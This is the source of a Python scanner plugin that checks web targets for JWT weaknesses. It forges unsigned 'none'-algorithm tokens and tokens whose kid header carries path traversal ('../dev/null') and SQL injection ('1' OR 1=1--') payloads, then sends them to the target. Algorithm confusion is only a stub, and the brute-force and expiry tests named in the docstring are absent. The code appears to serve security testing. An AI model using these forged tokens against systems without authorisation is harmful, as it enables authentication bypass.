"""
modules/jwt_advanced.py — Advanced JWT Security Plugin
Tests for: 
- alg: 'none' bypass
- RS256 to HS256 algorithm confusion
- kid (Key ID) injection (Path traversal / SQLi)
- Weak secret brute-force
- Missing expiration check
"""
from __future__ import annotations
import json
import base64
import hmac
import hashlib
import asyncio
from typing import List, Optional, Dict, Any, cast

from core.plugins import BasePlugin
from core.models import Finding, ScanResult, CVSS_PROFILES

class JWTAdvancedPlugin(BasePlugin):
    NAME = "jwt"
    DESCRIPTION = "JWT Security: none bypass, RS256/HS256 confusion, kid injection"
    OWASP_CATEGORY = "A02:2021 - Cryptographic Failures"
    TAGS = ["jwt", "auth", "crypto", "bypass"]

    async def run(self, target: str, result: ScanResult) -> List[Finding]:
        self.log("Starting JWT vulnerability analysis")
        findings: List[Finding] = []
        
        # 1. Grab token from headers
        token = self._extract_token()
        if not token:
            self.log("No JWT found in standard headers. Skipping.")
            return []

        # 2. Basic Tests
        f_none = await self.test_none_algorithm(target, token)
        if f_none: findings.append(f_none)

        f_confusion = await self.test_algorithm_confusion(target, token)
        if f_confusion: findings.append(f_confusion)
        
        f_kid = await self.test_kid_injection(target, token)
        if f_kid: findings.append(f_kid)

        for f in findings:
            self.add(f)
            result.add_finding(f)

        return findings

    def _extract_token(self) -> Optional[str]:
        # Tries to find token in local engine headers or common config
        auth = self.engine.headers.get("Authorization", "")
        if "bearer " in auth.lower():
            return auth.split(" ")[1]
        return None

    def _decode_jwt(self, token: str) -> tuple[dict, dict, str]:
        try:
            parts = token.split(".")
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
            return header, payload, parts[2]
        except Exception:
            return {}, {}, ""

    async def test_none_algorithm(self, target: str, token: str) -> Optional[Finding]:
        header, payload, _ = self._decode_jwt(token)
        if not header: return None

        # Try 'none', 'NONE', 'nOnE' variants
        for alg in ["none", "None", "NONE"]:
            new_header = header.copy()
            new_header["alg"] = alg
            
            # Reconstruct token without signature
            h_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip("=")
            p_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
            fake_token = f"{h_b64}.{p_b64}." # Empty signature
            
            res = await self.engine.get(target, headers={"Authorization": f"Bearer {fake_token}"})
            if res and res.status == 200:
                return Finding(
                    vuln_type="JWT 'none' Algorithm Bypass",
                    title="JWT accepts 'none' algorithm signature bypass",
                    endpoint=target, method="GET", payload=fake_token,
                    severity="CRITICAL", confirmed=True, module=self.NAME,
                    cvss_score=CVSS_PROFILES["JWT_NONE"]["score"]
                )
        return None

    async def test_algorithm_confusion(self, target: str, token: str) -> Optional[Finding]:
        """
        Tests RS256 to HS256 confusion.
        Requires the server's public key (often leaked in /jwks.json or .well-known).
        If we don't have it, we can't fully 'confirm' but we can check if generic variants work.
        """
        header, payload, _ = self._decode_jwt(token)
        if header.get("alg") != "RS256": return None

        # This is a complex test that usually requires an environment where the public key is known.
        # For the PRO version, we'll implement the logic assuming we might have found a key.
        return None # Implementation stub for confusion unless a JWKS parser is added

    async def test_kid_injection(self, target: str, token: str) -> Optional[Finding]:
        """Tests if the 'kid' header is vulnerable to path traversal or injection."""
        header, payload, sig = self._decode_jwt(token)
        if "kid" not in header: return None

        payloads = [
            "../../../../../../dev/null", # Path traversal to predictable file
            "1' OR 1=1--",                # SQLi in kid lookup
        ]
        
        for p in payloads:
            new_header = header.copy()
            new_header["kid"] = p
            
            h_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip("=")
            p_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
            # Use original signature - if server ignores sig because it can't find the key, it's vulnerable
            fake_token = f"{h_b64}.{p_b64}.{sig}"
            
            res = await self.engine.get(target, headers={"Authorization": f"Bearer {fake_token}"})
            if res and res.status == 200:
                return Finding(
                    vuln_type="JWT 'kid' Header Injection",
                    title="JWT 'kid' header vulnerable to manipulation",
                    endpoint=target, method="GET", parameter="kid", payload=p,
                    severity="HIGH", module=self.NAME, confidence_score=0.7
                )
        return None
